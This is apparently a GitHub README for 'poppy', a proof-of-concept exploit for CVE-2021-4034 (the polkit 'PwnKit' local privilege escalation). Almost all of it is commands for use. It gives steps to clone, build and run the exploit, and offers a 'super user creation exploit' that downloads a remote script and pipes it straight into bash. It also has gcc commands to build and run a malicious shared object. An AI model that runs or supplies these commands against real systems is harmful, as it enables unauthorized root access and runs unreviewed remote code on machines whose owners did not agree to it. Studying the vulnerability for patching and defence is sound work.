# poppy : CVE-2021-4034
CVE-2021-4034 PoC , polkit &lt; 0.131

## Usage

Tested on Arch Linux (Manjaro & Axyl OS)
```shell
git clone https://github.com/tahaafarooq/poppy
make
./poppy
```

**Super user creation exploit**

```shell
bash -c "$(curl -fsSL https://raw.githubusercontent.com/tahaafarooq/poppy/main/suuser.sh)"
```

```shell
gcc -shared su.c -o suuser -Wl,-e,entry -fPIC
./suuser
```


## POC
![anotherone](https://user-images.githubusercontent.com/49201347/151382446-242aa1f9-4eb9-40cf-98fb-a74aef95b668.png)

For more information about this vulnerability refer to the writeup https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
